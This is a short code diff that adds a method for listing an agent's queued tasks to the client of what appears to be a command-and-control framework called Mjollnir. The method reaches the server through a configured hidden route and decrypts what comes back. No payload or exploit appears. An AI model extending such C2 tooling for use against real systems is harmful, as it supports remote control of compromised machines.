@@ -29,6 +29,20 @@ class Task():
 			print("[-] Cannot create the task for the agent: " + agent_uid)
 			return self.misc.decrypt(r.content)
 
+	def list_agent_task(self, agent_uid):
+		# GET mjollir_url/hidden_route/task?agent_uid=agent_uid
+		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
+		endpoint = self.config["endpoints"]["task"] + "?agent_uid=" + agent_uid
+
+		r = self.s.get(url+endpoint)
+		if r.status_code == 200:
+			#print(self.misc.decrypt(r.content))
+			return self.misc.decrypt(r.content)
+		else:
+			print("[-] Cannot list the tasks for the agent: " + agent_uid)
+			return self.misc.decrypt(r.content)
+
+
 	def get_result(self, agent_uid, task_uid):
 		# GET mjollir_url/hidden_route/task/task_uid
 		url = self.config["mjollnir_c2_url"] + self.config["hidden_route"]
